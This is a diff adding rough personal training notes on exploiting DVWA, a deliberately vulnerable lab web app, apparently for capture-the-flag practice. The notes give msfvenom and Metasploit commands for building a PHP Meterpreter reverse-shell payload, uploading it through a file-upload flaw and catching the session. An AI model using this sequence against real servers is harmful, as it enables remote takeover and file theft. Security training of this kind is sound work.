@@ -251,7 +251,19 @@ Website:
 
 -> find / -name Flag.txt 2>/dev/null 
 
- 
+ DVWA- Training:
+1. Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file
+upload/ File inclusion vulnerability on DVWA.
+2. msfconsole in one tab next in new tab
+3. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw
+>exploit.php
+4. >use exploit/multi/handler or use 30
+5. >set payload php/meterpreter/reverse_tcp
+6. Set LHOST ipadd
+7. Upload a file you created as exploit.php
+8. Open terminal and type run once you get url type url in brower you get
+meterpreter session then type ls get the files
+
 DVWA: 
 Commad injection or  
 
